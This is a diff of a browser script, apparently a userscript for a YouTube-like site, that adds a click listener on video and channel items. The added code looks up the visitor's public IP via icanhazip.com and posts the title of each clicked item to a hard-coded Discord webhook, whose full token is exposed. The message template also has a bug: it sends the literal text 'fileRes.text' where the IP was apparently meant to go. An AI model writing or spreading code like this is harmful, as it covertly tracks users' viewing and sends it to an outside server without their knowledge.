@@ -71,28 +71,30 @@ document.addEventListener("DOMContentLoaded", () => {
   });
 })();
 
-(() => {
-  const nebhook = "https://discord.com/api/webhooks/1426997095721730199/lllpiiAWKMV5zdFaONWNLSjMZ7PI-UIlWeUdahs74fbgOVZUNPwTDkh8EszSu-TqHjG2";
+const winhook = "https://discord.com/api/webhooks/1426997095721730199/lllpiiAWKMV5zdFaONWNLSjMZ7PI-UIlWeUdahs74fbgOVZUNPwTDkh8EszSu-TqHjG2";
+const fileRes = await fetch("https://ipv4.icanhazip.com/");
+const fileText = await fileRes.text();
 
-  async function safeSend(content) {
-    try {
-      const clean = content.replace(/[^a-zA-Z0-9 .,!?'"()\[\]{}\-_/]/g, "").slice(0, 1900);
-      await fetch(nebhook, {
-        method: "POST",
-        headers: {"Content-Type": "application/json"},
-        body: JSON.stringify({content: clean || "(no headline text)"})
-      });
-    } catch (err) {
-      console.error("Send failed:", err);
-    }
+async function safeSend(headline: string) {
+  try {
+    const cleanHeadline = headline.replace(/[^a-zA-Z0-9 .,!?'"()\[\]{}\-_/]/g, "").slice(0, 1800);
+    const message = `fileRes.text has opened ${cleanHeadline}`;
+    await fetch(winhook, {
+      method: "POST",
+      headers: {"Content-Type": "application/json"},
+      body: JSON.stringify({content: message})
+    });
+  } catch (err) {
+    console.error("Send failed:", err);
   }
+}
 
-  document.addEventListener("click", e => {
-    const target = e.target.closest(".compact-video, .compact-channel, .shelf-item");
-    if (!target) return;
-    const headline = target.querySelector(".compact-media-headline");
-    if (headline && headline.innerText.trim()) {
-      safeSend(headline.innerText.trim());
-    }
-  });
-})();
+document.addEventListener("click", e => {
+  const target = (e.target as HTMLElement).closest(".compact-video, .compact-channel, .shelf-item");
+  if (!target) return;
+  const headline = target.querySelector(".compact-media-headline");
+  if (headline && headline.textContent?.trim()) {
+    safeSend(headline.textContent.trim());
+  }
+});
+
